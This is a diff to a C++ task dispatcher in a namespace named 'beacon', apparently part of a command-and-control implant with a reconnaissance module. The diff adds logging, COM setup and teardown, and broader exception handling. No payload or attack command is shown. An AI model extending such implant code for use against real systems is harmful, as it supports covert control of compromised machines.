@@ -18,6 +18,7 @@
 #include "../fs/FileSystem.h"
 #include "../recon/DeepRecon.h"
 #include "../crypto/Base64.h"
+#include "../utils/Logger.h"
 #include <stdexcept>
 #include <sstream>
 #include <filesystem>
@@ -28,6 +29,10 @@ TaskDispatcher::TaskDispatcher(moodycamel::ConcurrentQueue<Result>& pendingResul
     : pendingResults_(pendingResults) {}
 
 void TaskDispatcher::dispatch(const Task& task) {
+    LOG_DEBUG("Dispatching task " + task.task_id + "...");
+    // Each thread must initialize COM to use WMI/COM modules
+    HRESULT hrCom = CoInitializeEx(NULL, COINIT_MULTITHREADED);
+    
     Result result;
     result.task_id = task.task_id;
 
@@ -252,13 +257,27 @@ void TaskDispatcher::dispatch(const Task& task) {
             }
             default:
                 result.error = "Unknown or unsupported task type.";
+                LOG_WARN("Unsupported task type received: " + task.task_id);
                 break;
+        }
+        if (result.error.empty()) {
+            LOG_INFO("Task " + task.task_id + " completed successfully.");
+        } else {
+            LOG_ERR("Task " + task.task_id + " failed: " + result.error);
         }
     } catch (const std::exception& e) {
         result.error = e.what();
+        LOG_ERR("Exception in TaskDispatcher (" + task.task_id + "): " + std::string(e.what()));
+    } catch (...) {
+        result.error = "Unknown non-C++ exception occurred in dispatcher";
+        LOG_ERR("Unknown non-C++ exception in TaskDispatcher (" + task.task_id + ")");
     }
 
     pendingResults_.enqueue(result);
+    
+    if (SUCCEEDED(hrCom)) {
+        CoUninitialize();
+    }
 }
 
 } // namespace beacon
